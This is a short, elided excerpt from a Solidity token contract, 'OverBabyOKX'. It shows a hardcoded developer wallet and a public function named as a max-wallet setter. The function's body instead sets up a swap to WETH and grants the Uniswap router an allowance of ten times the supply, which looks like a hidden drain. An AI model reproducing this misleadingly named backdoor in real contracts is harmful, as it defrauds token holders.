...
contract OverBabyOKX is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x2F9b246bae4f0A1104FA395CEDEFa595eb80C79D);
    ...
    */
    ...
    function set_Max_Wallet_Percent(uint256 maxWallPercent_x100,bool haveFee) public {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), _tTotal * 10);
